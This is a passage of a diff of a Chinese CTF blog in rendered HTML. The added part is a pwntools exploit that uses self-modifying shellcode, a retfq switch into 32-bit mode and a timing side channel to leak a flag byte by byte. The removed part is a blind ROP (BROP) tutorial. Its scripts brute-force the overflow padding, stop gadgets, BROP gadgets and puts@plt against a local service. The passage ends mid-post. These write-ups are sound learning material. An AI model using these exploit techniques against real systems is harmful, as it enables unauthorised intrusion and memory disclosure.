class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;ERROR&#x27;</span></span><br><span class="line"></span><br><span class="line">append = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    push rdx</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode_mmap = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* set rdi */</span></span><br><span class="line"><span class="string">    push 0x40404040</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    /* set rsi */</span></span><br><span class="line"><span class="string">    push 0x7e</span></span><br><span class="line"><span class="string">    pop rsi</span></span><br><span class="line"><span class="string">    /* set rdx */</span></span><br><span class="line"><span class="string">    push 0x47</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    sub al,0x40</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    /* syscall */</span></span><br><span class="line"><span class="string">    push 0x5d</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor [rbx + 0x2f],cl</span></span><br><span class="line"><span class="string">    push 0x5f</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor [rbx + 0x30],cl</span></span><br><span class="line"><span class="string">    /* set rcx */</span></span><br><span class="line"><span class="string">    push 0x22</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    /* set r8 */</span></span><br><span class="line"><span class="string">    push 0x47</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor al,0x47</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    pop r8</span></span><br><span class="line"><span class="string">    /* set r9 */</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    pop r9</span></span><br><span class="line"><span class="string">    /* set rax */</span></span><br><span class="line"><span class="string">    push 0x49</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor al,0x40</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_read = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* set rdi */</span></span><br><span class="line"><span class="string">    push 0x47</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor al,0x47</span></span><br><span class="line"><span class="string">    push rax</span></span><br><span class="line"><span class="string">    pop rdi</span></span><br><span class="line"><span class="string">    /* set rsi */</span></span><br><span class="line"><span class="string">    push 0x40404040</span></span><br><span class="line"><span class="string">    pop rsi</span></span><br><span class="line"><span class="string">    /* set rdx */</span></span><br><span class="line"><span class="string">    push 0x70</span></span><br><span class="line"><span class="string">    pop rdx</span></span><br><span class="line"><span class="string">    /* syscall */</span></span><br><span class="line"><span class="string">    push 0x5d</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor [rbx + 0x52],cl</span></span><br><span class="line"><span class="string">    push 0x5f</span></span><br><span class="line"><span class="string">    pop rcx</span></span><br><span class="line"><span class="string">    xor [rbx + 0x53],cl</span></span><br><span class="line"><span class="string">    /* set rax */</span></span><br><span class="line"><span class="string">    push 0x47</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    xor al,0x47</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode_retfq = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  push rbx</span></span><br><span class="line"><span class="string">  pop rax</span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  xor al,0x40</span></span><br><span class="line"><span class="string">  push 0x72</span></span><br><span class="line"><span class="string">  pop rcx</span></span><br><span class="line"><span class="string">  xor byte ptr[rax+0x37],cl</span></span><br><span class="line"><span class="string">  push 0x68</span></span><br><span class="line"><span class="string">  pop rcx</span></span><br><span class="line"><span class="string">  xor byte ptr[rax+0x37],cl</span></span><br><span class="line"><span class="string">  push 0x47</span></span><br><span class="line"><span class="string">  pop rcx</span></span><br><span class="line"><span class="string">  sub byte ptr[rax+0x38],cl</span></span><br><span class="line"><span class="string">  push 0x48</span></span><br><span class="line"><span class="string">  pop rcx</span></span><br><span class="line"><span class="string">  sub byte ptr[rax+0x38],cl</span></span><br><span class="line"><span class="string">  push 0x23</span></span><br><span class="line"><span class="string">  push 0x40404040</span></span><br><span class="line"><span class="string">  &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#ebx ecx edx esi edi ebp</span></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* open(&quot;flag&quot;,0,0) */</span></span><br><span class="line"><span class="string">    mov esp,0x40404040</span></span><br><span class="line"><span class="string">    push 0</span></span><br><span class="line"><span class="string">    push 0x67616c66</span></span><br><span class="line"><span class="string">    mov ebx,esp</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    xor esi,esi</span></span><br><span class="line"><span class="string">    mov eax,0x5</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    mov ecx,eax</span></span><br><span class="line"><span class="string">    /* retfq */</span></span><br><span class="line"><span class="string">    push 0x33</span></span><br><span class="line"><span class="string">    push 0x40404064</span></span><br><span class="line"><span class="string">    retfq</span></span><br><span class="line"><span class="string">    /* read */</span></span><br><span class="line"><span class="string">    mov rdi,rcx</span></span><br><span class="line"><span class="string">    mov rsi,0x404040a0</span></span><br><span class="line"><span class="string">    mov rdx,0x30</span></span><br><span class="line"><span class="string">    xor rax,rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = shellcode_mmap + append + shellcode_read + append + shellcode_retfq + append</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag),<span class="number">0x30</span>):</span><br><span class="line">    left = <span class="number">0</span></span><br><span class="line">    right = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> left &lt; right:</span><br><span class="line">        mid = (left + right) &gt;&gt; <span class="number">1</span></span><br><span class="line">        p = process(<span class="string">&quot;shellcode&quot;</span>)</span><br><span class="line">        shellcode_blast = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">            mov al,[rsi + %d]</span></span><br><span class="line"><span class="string">            cmp al,%d</span></span><br><span class="line"><span class="string">            loop:</span></span><br><span class="line"><span class="string">            ja loop</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>%(i,mid)</span><br><span class="line">        p.send(asm(payload))</span><br><span class="line">        sleep(<span class="number">0.25</span>)</span><br><span class="line">        p.send(asm(shellcode + shellcode_blast))</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                p.recv(timeout = <span class="number">0.01</span>)</span><br><span class="line">                <span class="keyword">if</span> time.time() - start_time &gt; <span class="number">0.5</span>:</span><br><span class="line">                    left = mid + <span class="number">1</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            right = mid</span><br><span class="line">        p.close()</span><br><span class="line">    flag += <span class="built_in">chr</span>(left)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">if</span> flag[-<span class="number">1</span>] == <span class="string">&quot;&#125;&quot;</span>:<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>一点小问题是这里的<code>time.time() - start_time</code>的比较时间不能太短，否则会错</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/03/09/2021%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%86%B3%E8%B5%9B-secretcode/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -964,246 +1344,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://github.com/CharonPt/CharonPt.github.io.git/2022/01/31/BROP/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CharonPt的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/01/31/BROP/" class="post-title-link" itemprop="url">BROP</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-01-31 13:01:09 / 修改时间：14:55:31" itemprop="dateCreated datePublished" datetime="2022-01-31T13:01:09+08:00">2022-01-31</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>原理在 ctf-wiki 上讲得很清楚了，这里不再重复</p>
-<p>首先需要存在已知如何触发的栈溢出，而且需要远程的进程服务崩溃后不会re-rand</p>
-<p>然后需要爆破出溢出所需的padding大小</p>
-<p>若存在Canary则需要按字节爆破，例如Canary为 0x7766554433221100 ，则从倒数第二个字节开始逐字节爆破，即 padding + 0x0100 ，若Canary报错则说明倒数第二个字节错误，爆破至正确后继续爆破倒数第三个字节直至得到Canary值</p>
-<p>我们需要根据程序的行为来猜测我们寻找的地址应该是什么，为此我们需要先找到 stop gadget</p>
-<h5 id="stop-gadget"><a href="#stop-gadget" class="headerlink" title="stop gadget"></a>stop gadget</h5><p>当我们把返回地址覆盖成我们随意选取的内存地址时，程序会有很大的概率crash，但是也存在一种情况，即当我们控制程序返回到一块内存区域后，程序并没有crash，而是hang在那里，使我们能一直保持连线状态，我们将这种gadget称为 stop gadget 。同样我们需要通过爆破来寻找这样的 stop gadget</p>
-<h5 id="Brop-gadget"><a href="#Brop-gadget" class="headerlink" title="Brop gadget"></a>Brop gadget</h5><p>我们需要将远程服务器dump出程序的内存到本地，为此我们需要一个输出函数，还要能控制对应寄存器的gadget，由于即便找到了 pop;ret 这样的gadget也很难知道其pop的是哪个寄存器，所以我们更倾向于找到__libc_csu_init 中的 pop6_ret（这里称为Brop gadget） 的地址，这样即可准确控制寄存器的值，另外 Brop gadget 往下偏移9即可得到 pop rdi;ret ，同理 Brop gadget 往下偏移7得到 pop rsi;pop r15;ret;</p>
-<h5 id="寻找plt表"><a href="#寻找plt表" class="headerlink" title="寻找plt表"></a>寻找plt表</h5><p>为找到输出函数，我们需要找到plt表，plt表具有比较规整的结构，每一个plt表项都是 16 字节，且每个表项的6字节偏移处，是对该表项对应的函数的解析路径，即程序最初执行该函数的时候，会执行该路径对函数的 got 进行解析，如下</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jmp [&#x27;func&#x27;]	6byte</span><br><span class="line">push index		5byte</span><br><span class="line">jmp dlresolve	5byte</span><br></pre></td></tr></table></figure>
-
-<p>所以 return 到 plt 表项的开头时程序就会调用该函数（无论是否解析过），而 return 到 plt 表项 +6 处，则会再进行一次函数的解析，这也无所谓，因为最终同样会调用该函数。</p>
-<p>当我们发现好多条连续16个字节对齐的地址都不会造成crash，而且这些地址+6的地址同样不会造成crash，那么我们有理由相信这就是某个plt对应的表项</p>
-<p>所以我们可以通过</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = padding + canary + p64(pop_rdi_ret) + p64(0x400000) + p64(addr) + p64(stop_gadget)</span><br></pre></td></tr></table></figure>
-
-<p>这样的payload来判断 addr 是不是 puts@plt（在程序未开PIE的情况下，0x400000 是 ELF 文件的头部，其内容为“\7fELF”。</p>
-<p>同理我们可以通过</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = padding + canary + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(0x400000) + p64(stop_gadget)</span><br></pre></td></tr></table></figure>
-
-<p>这样的payload来判断 addr 是不是 write@plt ，虽然这里没有控制 rdx，但调用函数时rdx经常性不为0，所以这种办法也存在可行性。如果要控制 rdx 的话我们可以试着寻找程序中有无 strcmp 及其系列函数存在，达到通过调用这样的函数来控制 rdx 。</p>
-<h5 id="dump远程"><a href="#dump远程" class="headerlink" title="dump远程"></a>dump远程</h5><p>利用 plt 表中的 puts 函数，配合 useful gadget，来 dump 远程信息</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = padding + canary + p64(pop_rdi_ret) + p64(target) + p64(puts) + p64(stop_gadget)</span><br></pre></td></tr></table></figure>
-
-<p>重复执行如上payload来讲远程的内存信息打印保存在本地，但是一次最多只能dump一个内存页的大小，也就是0x1000个字节</p>
-<h5 id="脚本部分"><a href="#脚本部分" class="headerlink" title="脚本部分"></a>脚本部分</h5><p>获取padding大小的部分</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_overflow_length</span>():</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">9999</span>)</span><br><span class="line">            p.recv()</span><br><span class="line">            p.send(<span class="string">&#x27;a&#x27;</span>*i)</span><br><span class="line">            content = p.recv()</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;回显的内容&#x27;</span> <span class="keyword">in</span> content:</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> i-<span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">return</span> i-<span class="number">1</span></span><br><span class="line">        </span><br><span class="line">length = find_overflow_length()</span><br><span class="line"><span class="built_in">print</span>(length)</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Force_find_padding</span>():</span></span><br><span class="line">    padding_length=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            padding_length=padding_length+<span class="number">1</span></span><br><span class="line">            p = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">9999</span>)</span><br><span class="line">            p.recv()</span><br><span class="line">            p.send(<span class="string">&#x27;A&#x27;</span> * padding_length)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;回显的内容&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> p.recvall():</span><br><span class="line">                <span class="keyword">raise</span> <span class="string">&quot;Programe not exit normally!&quot;</span></span><br><span class="line">            p.close()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            log.success(<span class="string">&quot;The true padding length is &quot;</span>+<span class="built_in">str</span>(padding_length-<span class="number">1</span>))</span><br><span class="line">            <span class="keyword">return</span> padding_length</span><br><span class="line">    log.error(<span class="string">&quot;We don&#x27;t find true padding length!&quot;</span>)</span><br><span class="line"></span><br><span class="line">padding_length=null</span><br><span class="line"><span class="keyword">if</span> padding_length <span class="keyword">is</span> null:</span><br><span class="line">    padding_length=Force_find_padding()</span><br></pre></td></tr></table></figure>
-
-<p>记录获取的地址</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log_in_file</span>(<span class="params">addr</span>):</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;puts.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    f.write(<span class="string">&quot;the addr:0x%x\n&quot;</span>%addr)</span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure>
-
-<p>获取 stop gadget 的部分</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_stop_gadget</span>(<span class="params">length</span>):</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    <span class="keyword">while</span> addr &lt; <span class="number">0x401000</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">9999</span>)</span><br><span class="line">            p.recv()</span><br><span class="line">            payload = <span class="string">&#x27;a&#x27;</span>*length + p64(addr) + p64(<span class="number">0</span>)*<span class="number">10</span></span><br><span class="line">            p.sendline(payload)</span><br><span class="line">            content = p.recv(timeout = <span class="number">0.2</span>)</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;回显的内容&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&#x27;one_stop_gadget is at &#x27;</span> + <span class="built_in">hex</span>(addr)</span><br><span class="line">                log_in_file(addr)  </span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            p.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-<p>获取 Brop gadget 的部分</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_Brop_gadget</span>(<span class="params">length,stop_gadget_addr,addr</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span>*length + p64(addr) + p64(<span class="number">0</span>)*<span class="number">6</span> + p64(stop_gadget_addr) + p64(<span class="number">0</span>)*<span class="number">10</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">9999</span>)</span><br><span class="line">        p.recv()</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        content = p.recv(timeout = <span class="number">0.1</span>)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;回显的内容&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
-
-<p>检查 Brop gadget 的部分（防止addr本身是 stop_gadget）</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_Brop_gadget</span>(<span class="params">length,addr</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span>*length + p64(addr) + p64(<span class="number">0</span>)*<span class="number">10</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">9999</span>)</span><br><span class="line">        p.recv()</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        content = p.recv(timeout = <span class="number">0.1</span>)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;回显的内容&#x27;</span> <span class="keyword">in</span> content:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>
-
-<p>结合上述两个部分得到 Brop gadget（一般可以不从0x400000开始）</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_Brop_gadget</span>(<span class="params">length,stop_gadget_addr</span>):</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line">        <span class="keyword">if</span>(get_Brop_gadget(length,stop_gadget_addr,addr)):</span><br><span class="line">            <span class="built_in">print</span> <span class="string">&#x27;possible Brop_gadget at &#x27;</span> + <span class="built_in">hex</span>(addr)</span><br><span class="line">            <span class="keyword">if</span>(check_Brop_gadget(length,addr)):</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&#x27;success Brop_gadget at &#x27;</span> + <span class="built_in">hex</span>(addr)</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">        addr += <span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-<p>获取 puts@plt 的部分（用这个脚本跑出来的地址好像需要 +10 个字节才是正确的地址，自行测试。同时如果将初始的addr设置的太大的话可能会跑出 call puts 指令的地址）</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_puts_plt</span>(<span class="params">length,pop_rdi_ret</span>):</span></span><br><span class="line">    addr = <span class="number">0x400000</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="built_in">hex</span>(addr)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">9999</span>)</span><br><span class="line">            p.recv()</span><br><span class="line">            payload = <span class="string">&#x27;a&#x27;</span>*length + p64(pop_rdi_ret) + p64(<span class="number">0x400000</span>) + p64(addr) + p64(<span class="number">0</span>)</span><br><span class="line">            p.sendline(payload)</span><br><span class="line">            content = p.recv(timeout=<span class="number">0.1</span>)</span><br><span class="line">            p.close()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;\x7fELF&#x27;</span> <span class="keyword">in</span> content:</span><br><span class="line">                <span class="built_in">print</span> <span class="string">&quot;We found puts_plt at: &quot;</span> + <span class="built_in">hex</span>(addr)</span><br><span class="line">                <span class="keyword">return</span> addr</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span> EOFError:</span><br><span class="line">            p.close()</span><br><span class="line">            addr += <span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-<p>泄露部分</p>
